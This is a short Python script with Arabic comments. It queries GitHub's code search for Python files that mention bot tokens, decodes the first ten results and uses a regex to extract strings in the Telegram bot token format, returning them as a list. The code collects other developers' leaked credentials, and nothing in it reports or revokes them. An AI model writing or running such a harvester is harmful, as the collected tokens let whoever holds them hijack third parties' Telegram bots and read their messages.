import re
import os
from github import Github

def search_for_tokens(token):
    g = Github(token)
    # البحث عن نمط توكن تيليجرام الشائع
    query = 'token "bot" extension:py' 
    result = g.search_code(query=query)
    
    found_tokens = []
    # فحص أول 10 نتائج (يمكنك زيادتها)
    for content_file in result[:10]:
        try:
            content = content_file.decoded_content.decode('utf-8')
            tokens = re.findall(r'[0-9]{8,10}:[a-zA-Z0-9_-]{35}', content)
            found_tokens.extend(tokens)
        except:
            continue
    return list(set(found_tokens))
